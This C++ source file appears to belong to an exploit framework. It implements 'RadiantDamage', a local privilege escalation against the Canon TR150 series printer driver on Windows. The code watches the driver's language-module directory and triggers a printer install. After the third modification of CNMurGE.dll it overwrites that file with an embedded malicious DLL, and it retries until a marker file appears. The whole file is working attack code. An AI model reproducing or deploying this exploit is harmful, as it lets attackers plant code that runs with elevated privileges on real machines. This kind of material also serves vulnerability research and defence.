#include "radiantdamage.hpp"

#include "inject_me.hpp"

#include <Windows.h>
#include <iostream>
#include <thread>
#include <filesystem>
#include <fstream>

namespace
{
    const int s_maxBuffer = 4096;
    const int s_notifyFilter = FILE_NOTIFY_CHANGE_LAST_WRITE | FILE_NOTIFY_CHANGE_SIZE | FILE_NOTIFY_CHANGE_LAST_ACCESS | FILE_NOTIFY_CHANGE_CREATION;

    typedef struct _DIRECTORY_INFO
    {
        HANDLE      hDir;
        TCHAR       lpszDirName[MAX_PATH];
        CHAR        lpBuffer[s_maxBuffer];
        DWORD       dwBufLength;
        OVERLAPPED  Overlapped;
    } DIRECTORY_INFO, * PDIRECTORY_INFO, * LPDIRECTORY_INFO;

    HANDLE checkTargetDirectory(const std::string& p_targetDirectory)
    {
        std::wstring wtargetDirectory(p_targetDirectory.begin(), p_targetDirectory.end());
        return CreateFile(wtargetDirectory.c_str(), FILE_LIST_DIRECTORY,
            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL,
            OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OVERLAPPED, NULL);
    }

    void handleDirectoryChange(HANDLE p_completionPort, const std::string p_target_dll, const std::string p_target_directory, const std::string p_malicious_dll)
    {
        DWORD numBytes, cbOffset;
        LPDIRECTORY_INFO di = NULL;
        LPOVERLAPPED lpOverlapped = NULL;
        PFILE_NOTIFY_INFORMATION fni = NULL;
        WCHAR FileName[MAX_PATH] = { 0 };
        int change_counter = 3;
        std::wstring wtargetDll(p_target_dll.begin(), p_target_dll.end());
        std::wstring wtargetDllPath(p_target_directory.begin(), p_target_directory.end());
        wtargetDllPath.append(wtargetDll);
        std::wstring wmaliciousDll(p_malicious_dll.begin(), p_malicious_dll.end());

        do
        {
            GetQueuedCompletionStatus(p_completionPort, &numBytes, (PULONG_PTR)&di, &lpOverlapped, INFINITE);
            if (di)
            {
                fni = (PFILE_NOTIFY_INFORMATION)di->lpBuffer;
                do
                {
                    cbOffset = fni->NextEntryOffset;

                    size_t num_elem = fni->FileNameLength / sizeof(WCHAR);
                    if (num_elem >= sizeof(FileName) / sizeof(WCHAR)) num_elem = 0;
                    wcsncpy_s(FileName, sizeof(FileName) / sizeof(WCHAR), fni->FileName, num_elem);
                    FileName[num_elem] = '\0';

                    if (fni->Action == FILE_ACTION_MODIFIED)
                    {
                        std::wcout << "[+] File modified event for " << FileName << " [" << change_counter << "]" << std::endl;
                        if (!wcscmp(FileName, wtargetDll.c_str()))
                        {
                            change_counter--;
                            if (change_counter == 0)
                            {
                                // sleep briefly
                                std::this_thread::sleep_for(std::chrono::milliseconds(1500));
                                if (CopyFile(wmaliciousDll.c_str(), wtargetDllPath.c_str(), FALSE) != 0)
                                {
                                    std::wcout << "[+] Copied " << wmaliciousDll << " to " << wtargetDllPath << std::endl;
                                }
                                else
                                {
                                    std::wcout << "[-] Failed to copy " << wmaliciousDll << " to " << wtargetDllPath << std::endl;
                                }

                                return;
                            }
                        }
                    }
                    fni = (PFILE_NOTIFY_INFORMATION)((LPBYTE)fni + cbOffset);
                }
                while (cbOffset);

                // Reissue the watch command
                ReadDirectoryChangesW(di->hDir, di->lpBuffer, s_maxBuffer, TRUE, s_notifyFilter, &di->dwBufLength, &di->Overlapped, NULL);
            }
        } while (di);
    }
}

RadiantDamage::RadiantDamage() :
	Exploit("Canon TR150 series", "RadiantDamage"),
	m_target_directory("C:\\ProgramData\\CanonBJ\\IJPrinter\\CNMWINDOWS\\Canon TR150 series\\LanguageModules\\040C\\"),
    m_target_dll("CNMurGE.dll"),
    m_malicious_dll("Dll.dll")
{
}

RadiantDamage::~RadiantDamage()
{
}

bool RadiantDamage::do_exploit()
{
    std::cout << "[+] Starting RADIANTDAMAGE" << std::endl;
    std::cout << "[+] Checking if " << m_target_directory << " exists" << std::endl;

    DIRECTORY_INFO dirInfo;
    memset(&dirInfo, 0, sizeof(DIRECTORY_INFO));
    dirInfo.hDir = checkTargetDirectory(m_target_directory);
    if (dirInfo.hDir == INVALID_HANDLE_VALUE)
    {
        std::cout << "[-] Target directory doesn't exist. Trigger install. " << std::endl;
        install_printer();
        dirInfo.hDir = checkTargetDirectory(m_target_directory);
        if (dirInfo.hDir == INVALID_HANDLE_VALUE)
        {
            std::cout << "[-] Failed to create " << m_target_directory << std::endl;
            return false;
        }
    }

    std::cout << "[+] Monitoring " << m_target_directory << std::endl;

    HANDLE hCompPort = NULL;
    std::wstring wtargetDirectory(m_target_directory.begin(), m_target_directory.end());
    lstrcpyn(dirInfo.lpszDirName, wtargetDirectory.c_str(), MAX_PATH);
    if ((hCompPort = CreateIoCompletionPort(dirInfo.hDir, hCompPort, (ULONG_PTR)&dirInfo, 0)) == NULL)
    {
        std::cout << "[!] CreateIoCompletionPort failed." << std::endl;
        CloseHandle(dirInfo.hDir);
        return false;
    }

    std::cout << "[+] Dropping dll to disk" << std::endl;
    std::ofstream dll_out(m_malicious_dll, std::ofstream::out | std::ofstream::binary | std::ofstream::trunc);
    for (unsigned int i = 0; i < inject_me_dll_len; i++)
    {
        dll_out << inject_me_dll[i];
    }
    dll_out.flush();
    dll_out.close();

    bool loop = true;
    while (loop)
    {
        ReadDirectoryChangesW(dirInfo.hDir, dirInfo.lpBuffer, s_maxBuffer, TRUE, s_notifyFilter, &dirInfo.dwBufLength, &dirInfo.Overlapped, NULL);
        std::thread watch(handleDirectoryChange, hCompPort, m_target_dll, m_target_directory, m_malicious_dll);
        install_printer();
        watch.join();
        std::cout << "[+] Sleep for 3 seconds" << std::endl;
        std::this_thread::sleep_for(std::chrono::milliseconds(3000));

        if (!std::filesystem::exists("C:\\result.txt"))
        {
            std::cout << "[-] Failed! Try the exploit again!" << std::endl;
        }
        else
        {
            std::cout << "[!] Mucho success!" << std::endl;
            loop = false;
        }
    }

    std::cout << "[+] Cleaning up dropped dll" << std::endl;
    _unlink(m_malicious_dll.c_str());
    CloseHandle(dirInfo.hDir);
    CloseHandle(hCompPort);
	return true;
}